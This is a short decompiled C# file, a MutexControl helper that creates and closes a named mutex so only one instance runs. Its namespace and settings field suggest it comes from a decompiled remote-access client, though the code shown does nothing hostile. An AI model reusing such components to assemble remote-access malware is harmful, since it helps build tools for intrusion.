using System;
using System.Threading;

namespace Client.Helper
{
	// Token: 0x0200000A RID: 10
	public static class MutexControl
	{
		// Token: 0x06000036 RID: 54 RVA: 0x000036E0 File Offset: 0x000018E0
		public static bool CreateMutex()
		{
			bool result;
			MutexControl.currentApp = new Mutex(false, Settings.MTX, ref result);
			return result;
		}

		// Token: 0x06000037 RID: 55 RVA: 0x00003704 File Offset: 0x00001904
		public static void CloseMutex()
		{
			if (MutexControl.currentApp != null)
			{
				MutexControl.currentApp.Close();
				MutexControl.currentApp = null;
			}
		}

		// Token: 0x0400001E RID: 30
		public static Mutex currentApp;
	}
}
